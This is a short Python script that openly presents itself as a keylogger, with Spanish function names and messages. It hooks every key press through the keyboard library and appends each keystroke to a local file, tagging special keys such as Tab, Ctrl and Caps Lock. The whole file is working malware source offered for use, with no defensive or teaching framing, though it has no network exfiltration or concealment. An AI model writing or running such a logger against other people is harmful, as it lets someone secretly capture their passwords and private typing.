import keyboard

def teclasPresionadas(key):
        
        with open('log_file', "a") as file:

            if key.name == "space":
                file.write(" ")
            elif key.name == "enter":
                file.write("\n")
            elif key.name == "tab":
                file.write("[TAB]")
            elif key.name == "backspace":
                file.write("[BACKSPACE]")
            elif key.name == "mayusculas":
                file.write("[L.SHIFT]")
            elif key.name == "right shift":
                file.write("[R.SHIFT]")
            elif key.name == "esc":
                file.write("[ESC]")
            elif key.name == "ctrl":
                file.write("[CTRL]")
            elif key.name == "alt":
                file.write("[ALT]")
            elif key.name == "bloq mayus":
                file.write("[CAPSLOCK]")
            elif key.name == "windows izquierda":
                file.write("[WINDOWS]")
            else:
                file.write(key.name)
print(f"Keylogger iniciado. Registrando en: log_file")
keyboard.on_press(teclasPresionadas)
keyboard.wait()
